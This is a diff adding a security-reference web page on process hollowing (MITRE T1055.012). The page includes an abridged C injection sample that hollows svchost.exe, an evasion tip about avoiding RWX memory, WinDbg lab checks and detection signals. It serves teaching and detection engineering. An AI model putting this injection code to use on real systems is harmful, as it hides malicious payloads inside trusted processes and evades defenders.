@@ -1,0 +1,155 @@
+---
+title: Process Hollowing
+mitre: T1055.012
+category: injection
+group: Image Replacement
+summary: Replace the image of a suspended process before it ever executes.
+platform: [Windows]
+tags: ['x64 / x86', 'C / C++']
+updated: '2026-07-21'
+author: thehackersbrain
+readingTime: 9 min read
+callChain:
+  - call: CreateProcessA(CREATE_SUSPENDED)
+    desc: Spawn a benign host binary; no thread runs yet.
+    dll: kernel32
+  - call: NtQueryInformationProcess
+    desc: Read the PEB to find the host image base address.
+    dll: ntdll
+  - call: NtUnmapViewOfSection
+    desc: Discard the legitimate image mapping. Loudest step.
+    dll: ntdll
+  - call: VirtualAllocEx + WriteProcessMemory
+    desc: Allocate at the payload's preferred base and copy headers plus sections.
+    dll: kernel32
+  - call: SetThreadContext + ResumeThread
+    desc: Redirect the entry point and let the hollowed process run.
+    dll: kernel32
+detections:
+  - src: SYSMON EID 8
+    text: CreateRemoteThread into a process whose start address is not backed by a mapped module.
+  - src: ETW-TI
+    text: A protection change to RX on private memory shortly after process creation.
+  - src: MEMORY SCAN
+    text: PEB ImageBaseAddress disagrees with the PEB_LDR_DATA module list entry for the main image.
+  - src: BEHAVIOURAL
+    text: svchost.exe spawned by a non-services.exe parent, with a suspended primary thread.
+related:
+  - mitre: T1055.013
+    title: Process Doppelgänging
+    desc: NTFS transactions replace the unmap step entirely.
+    href: /techniques/injection/process-doppelganging
+  - mitre: T1055.002
+    title: Module Stomping
+    desc: Overwrite a legitimately loaded DLL's .text in place.
+    href: /techniques/injection/module-stomping
+  - mitre: T1620
+    title: Reflective DLL Loading
+    desc: A DLL that maps itself — no LoadLibrary, no module list entry.
+    href: /techniques/injection/reflective-dll-loading
+labKit:
+  - label: hollow.c + Makefile
+    href: 'https://github.com/thehackersbrain/maldev-lab-kit'
+  - label: Sigma rule pack
+    href: /detections
+  - label: Detonation VM profile
+    href: /toolkit
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+Process hollowing is a code-injection technique in which a process is created in a suspended state,
+the memory of its legitimate image is unmapped, and a different PE image is written in its place
+before execution resumes. The result is a payload running under the identity, image path and
+signature metadata of a trusted binary such as `svchost.exe`.
+
+Because the container process is genuine, naive image-path and parent/child heuristics often fail to
+flag it — which is exactly why the memory artifacts it leaves behind matter so much for detection.
+
+<Callout type="note">
+  Most modern EDR products hook `NtUnmapViewOfSection`. Variants that avoid the unmap entirely —
+  transacted hollowing, module stomping — are covered further down and detect differently.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+Abridged for clarity — error handling and the relocation fix-up loop are omitted. The full annotated
+sample lives in the lab repo.
+
+<CodeBlock
+  file="hollow.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`// 1. spawn the sacrificial host, suspended
+CreateProcessA("C:\\\\Windows\\\\System32\\\\svchost.exe", NULL, NULL, NULL,
+               FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+
+// 2. read the PEB to locate the image base of the host
+NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation,
+                          &pbi, sizeof(pbi), &ret);
+ReadProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress + 0x10,
+                  &imageBase, sizeof(PVOID), NULL);
+
+// 3. unmap the legitimate image  <-- heavily monitored
+NtUnmapViewOfSection(pi.hProcess, imageBase);
+
+// 4. allocate RWX at the payload's preferred base, then write it
+PVOID dst = VirtualAllocEx(pi.hProcess, (PVOID)nt->OptionalHeader.ImageBase,
+                           nt->OptionalHeader.SizeOfImage,
+                           MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+WriteProcessMemory(pi.hProcess, dst, payload, nt->OptionalHeader.SizeOfHeaders, NULL);
+// ... section-by-section copy loop omitted ...
+
+// 5. point RCX at the new entry point and resume
+ctx.Rcx = (DWORD64)dst + nt->OptionalHeader.AddressOfEntryPoint;
+SetThreadContext(pi.hThread, &ctx);
+ResumeThread(pi.hThread);`}
+/>
+
+<Callout type="caution">
+  Allocating `PAGE_EXECUTE_READWRITE` is the single loudest thing this sample does. Real-world
+  implementations write with RW and flip to RX per-section with `VirtualProtectEx`.
+</Callout>
+
+## Verifying in the lab
+
+Detonate inside a snapshotted VM, attach WinDbg to the hollowed process and compare what the PEB
+claims against what the loader's module list holds. The two disagree in every variant of this
+technique — that disagreement is the artifact worth building a rule on.
+
+<CodeBlock
+  file="windbg"
+  lang="shellsession"
+  class="mb-7.5"
+  code={`> !address -f:Image
+  BaseAddress  RegionSize  State       Protect                 Usage
+  00007ff6\`... 0000d000    MEM_COMMIT  PAGE_EXECUTE_READWRITE  <unbacked>
+> !peb
+  ImageBaseAddress: 00007ff6\`00000000   // mismatch vs. loaded module list`}
+/>
+
+## Detection
+
+Every hollowed process shares one structural tell: executable memory that is not backed by a file on
+disk, inside a process whose PEB image base disagrees with the loader's module list.
+
+<DetectionGrid items={frontmatter.detections} />
+
+Rank these by cost, not by cleverness. The memory-scan check is the most reliable but only runs on
+demand; the Sysmon and ETW-TI signals are continuous and cheap, and catch the common tooling that
+still allocates RWX in one shot.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
